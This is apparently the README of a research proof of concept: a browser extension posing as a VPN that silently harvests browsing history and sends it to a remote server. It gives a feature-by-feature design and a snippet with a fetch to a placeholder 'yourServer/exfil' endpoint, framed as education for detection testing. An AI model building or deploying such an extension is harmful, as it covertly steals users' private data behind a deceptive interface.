# Malicious VPN Extension – Proof of Concept

> **⚠️ WARNING: This is a deliberately malicious browser extension created for security research and education only.**
> 
> It steals browsing history, exfiltrates it to a remote server, and uses a fake VPN interface as cover. Do **not** install this in any production browser, and **never** use it against targets without explicit permission. The authors assume no liability for misuse.

---

## Purpose

This repository demonstrates how a seemingly innocent browser extension (a “VPN” popup) can silently harvest sensitive user data in the background. It is meant to:

- Educate developers and users about the risks of rogue browser extensions
- Serve as a sample for security researchers testing detection tools (IDS, EDR, browser security scanners)
- Illustrate common malware techniques: data exfiltration, persistent background scripts, fake UI as social engineering

---

## What This Extension Actually Does

| Feature | Description |
|--------|-------------|
| **UI Front** | A polished popup that looks like a premium VPN: connect/disconnect toggle, server list, fake counters (MB saved, threats blocked). |
| **Background Data Theft** | Every 30 seconds, the background script scrapes the last 24 hours of browsing history (URLs, titles, visit times, counts). |
| **Victim Fingerprinting** | Generates a unique `victim_id` (UUID v4) stored in `chrome.storage.local` to track each installation. |
| **Data Exfiltration** | Sends batches of stolen history entries to a hardcoded remote server via HTTP POST (JSON). The batch system ensures no data is lost if the server is temporarily unreachable. |
| **Fake VPN Functionality** | The “connection” is entirely cosmetic. Toggling the switch changes the UI but has no real network effect. The IP addresses shown are hardcoded and not assigned by any actual VPN. |

All sensitive actions happen in a background service worker, completely invisible to the user while the extension is installed.

---

## File Overview

- **`popup.html`** – The deceptive UI, styled to look like a professional VPN panel.
- **`popup.js`** – Script that drives the fake connection animations, server switching, and incremental counters.
- **`background.js`** – The malicious core: sets up an alarm, scrapes history, manages a local pending queue, and exfiltrates data to a remote endpoint.
- **`manifest.json`** – (you should add this separately) Grants permissions like `history`, `storage`, `alarms`, and the `host_permissions` needed for the exfiltration fetch.

---

## How to Safely Test (for Research)

1. **Clone this repository and review the code thoroughly.**
2. **Replace the exfiltration endpoint** in `background.js`:
   ```javascript
   const response = await fetch('http://yourServer/exfil', { ... });
   // Change alarm if you want:
   chrome.alarms.create('stealHistory', { periodInMinutes: 0.5 }); // change the value of 0.5
   ```
3. Load the extension in a controlled environment:
   Enable “Developer mode” and load the unpacked extension.
   
---

## Ethics & Legal
This project is strictly for educational and defensive security research.

Do not use it to actually steal data from any person without explicit consent.

Unauthorized access to computer systems is illegal in most countries.

If you are using this in a Capture The Flag (CTF), lab, or training environment, ensure all participants are aware of its nature.

---

## Disclaimer
The code is provided “as is” without warranty of any kind. The authors are not responsible for any damage or legal issues caused by misuse. Use at your own risk, and only in environments you own or are authorized to test.
